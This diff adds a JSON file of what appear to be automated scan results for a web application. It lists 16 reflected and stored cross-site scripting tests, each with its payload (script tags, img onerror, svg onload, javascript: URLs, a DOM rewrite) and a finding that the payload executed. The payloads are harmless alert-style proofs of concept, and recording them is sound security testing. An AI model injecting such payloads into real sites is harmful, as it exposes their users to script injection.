@@ -1,0 +1,178 @@
+[
+    {
+        "test_type": "Reflected XSS",
+        "payload_name": "Basic Script Tag",
+        "payload": "<script>alert('XSS')</script>",
+        "connected": true,
+        "http_status": 200,
+        "attack_detected": true,
+        "vulnerability": true,
+        "detail": "Payload was reflected directly into HTML.",
+        "success": true
+    },
+    {
+        "test_type": "Reflected XSS",
+        "payload_name": "Image OnError",
+        "payload": "<img src=x onerror=alert('XSS')>",
+        "connected": true,
+        "http_status": 200,
+        "attack_detected": true,
+        "vulnerability": true,
+        "detail": "Payload was reflected directly into HTML.",
+        "success": true
+    },
+    {
+        "test_type": "Reflected XSS",
+        "payload_name": "SVG OnLoad",
+        "payload": "<svg onload=alert('XSS')>",
+        "connected": true,
+        "http_status": 200,
+        "attack_detected": true,
+        "vulnerability": true,
+        "detail": "Payload was reflected directly into HTML.",
+        "success": true
+    },
+    {
+        "test_type": "Reflected XSS",
+        "payload_name": "Iframe Injection",
+        "payload": "<iframe src='javascript:alert(\"XSS\")'></iframe>",
+        "connected": true,
+        "http_status": 200,
+        "attack_detected": true,
+        "vulnerability": true,
+        "detail": "Payload was reflected directly into HTML.",
+        "success": true
+    },
+    {
+        "test_type": "Reflected XSS",
+        "payload_name": "JS Protocol",
+        "payload": "javascript:alert('XSS')",
+        "connected": true,
+        "http_status": 200,
+        "attack_detected": true,
+        "vulnerability": true,
+        "detail": "Payload was reflected directly into HTML.",
+        "success": true
+    },
+    {
+        "test_type": "Reflected XSS",
+        "payload_name": "Script With DOM Change",
+        "payload": "<script>document.body.innerHTML='XSS Triggered'</script>",
+        "connected": true,
+        "http_status": 200,
+        "attack_detected": true,
+        "vulnerability": true,
+        "detail": "Payload was reflected directly into HTML.",
+        "success": true
+    },
+    {
+        "test_type": "Reflected XSS",
+        "payload_name": "Uppercase Script",
+        "payload": "<SCRIPT>alert('XSS')</SCRIPT>",
+        "connected": true,
+        "http_status": 200,
+        "attack_detected": true,
+        "vulnerability": true,
+        "detail": "Payload was reflected directly into HTML.",
+        "success": true
+    },
+    {
+        "test_type": "Reflected XSS",
+        "payload_name": "Broken Image With Text",
+        "payload": "<img src=1 onerror=alert('Stored XSS')>",
+        "connected": true,
+        "http_status": 200,
+        "attack_detected": true,
+        "vulnerability": true,
+        "detail": "Payload was reflected directly into HTML.",
+        "success": true
+    },
+    {
+        "test_type": "Stored XSS",
+        "payload_name": "Basic Script Tag",
+        "payload": "<script>alert('XSS')</script>",
+        "connected": true,
+        "http_status": 200,
+        "attack_detected": true,
+        "vulnerability": true,
+        "detail": "Stored XSS payload was saved without sanitization.",
+        "success": true
+    },
+    {
+        "test_type": "Stored XSS",
+        "payload_name": "Image OnError",
+        "payload": "<img src=x onerror=alert('XSS')>",
+        "connected": true,
+        "http_status": 200,
+        "attack_detected": true,
+        "vulnerability": true,
+        "detail": "Stored XSS payload was saved without sanitization.",
+        "success": true
+    },
+    {
+        "test_type": "Stored XSS",
+        "payload_name": "SVG OnLoad",
+        "payload": "<svg onload=alert('XSS')>",
+        "connected": true,
+        "http_status": 200,
+        "attack_detected": true,
+        "vulnerability": true,
+        "detail": "Stored XSS payload was saved without sanitization.",
+        "success": true
+    },
+    {
+        "test_type": "Stored XSS",
+        "payload_name": "Iframe Injection",
+        "payload": "<iframe src='javascript:alert(\"XSS\")'></iframe>",
+        "connected": true,
+        "http_status": 200,
+        "attack_detected": true,
+        "vulnerability": true,
+        "detail": "Stored XSS payload was saved without sanitization.",
+        "success": true
+    },
+    {
+        "test_type": "Stored XSS",
+        "payload_name": "JS Protocol",
+        "payload": "javascript:alert('XSS')",
+        "connected": true,
+        "http_status": 200,
+        "attack_detected": true,
+        "vulnerability": true,
+        "detail": "Stored XSS payload was saved without sanitization.",
+        "success": true
+    },
+    {
+        "test_type": "Stored XSS",
+        "payload_name": "Script With DOM Change",
+        "payload": "<script>document.body.innerHTML='XSS Triggered'</script>",
+        "connected": true,
+        "http_status": 200,
+        "attack_detected": true,
+        "vulnerability": true,
+        "detail": "Stored XSS payload was saved without sanitization.",
+        "success": true
+    },
+    {
+        "test_type": "Stored XSS",
+        "payload_name": "Uppercase Script",
+        "payload": "<SCRIPT>alert('XSS')</SCRIPT>",
+        "connected": true,
+        "http_status": 200,
+        "attack_detected": true,
+        "vulnerability": true,
+        "detail": "Stored XSS payload was saved without sanitization.",
+        "success": true
+    },
+    {
+        "test_type": "Stored XSS",
+        "payload_name": "Broken Image With Text",
+        "payload": "<img src=1 onerror=alert('Stored XSS')>",
+        "connected": true,
+        "http_status": 200,
+        "attack_detected": true,
+        "vulnerability": true,
+        "detail": "Stored XSS payload was saved without sanitization.",
+        "success": true
+    }
+]
